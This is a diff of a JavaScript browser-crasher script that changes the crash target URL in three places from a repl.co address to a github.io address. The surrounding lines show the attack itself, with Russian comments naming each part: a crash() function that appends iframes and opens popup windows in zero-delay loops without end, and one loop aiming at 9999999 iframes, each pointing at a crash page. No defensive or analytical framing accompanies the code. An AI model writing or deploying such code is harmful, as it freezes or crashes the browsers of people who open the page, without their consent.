@@ -7,7 +7,7 @@ function crash() {
   // Создание бесконечных iframe
   setInterval(function() {
     var iframe = document.createElement('iframe');
-    iframe.src = 'https://browser-crasher.mishal0legit.repl.co';
+    iframe.src = 'https://insult1ks.github.io/crash';
     iframe.width = 800;
     iframe.height = 600;
     document.body.appendChild(iframe);
@@ -15,7 +15,7 @@ function crash() {
 
   // Открытие бесконечных всплывающих окон
   setInterval(function() {
-    var popup = window.open('https://browser-crasher.mishal0legit.repl.co', '_blank', 'width=500,height=500');
+    var popup = window.open('https://insult1ks.github.io/crash', '_blank', 'width=500,height=500');
     if (popup) popup.focus();
   }, 0);
 
@@ -44,7 +44,7 @@ function crash() {
 
   // Функция для загрузки множества iframe
   (function loadMultipleIframes() {
-    var url = 'https://browser-crasher.mishal0legit.repl.co';
+    var url = 'https://insult1ks.github.io/crash';
     var numIframes = 9999999;
 
     var index = 0;
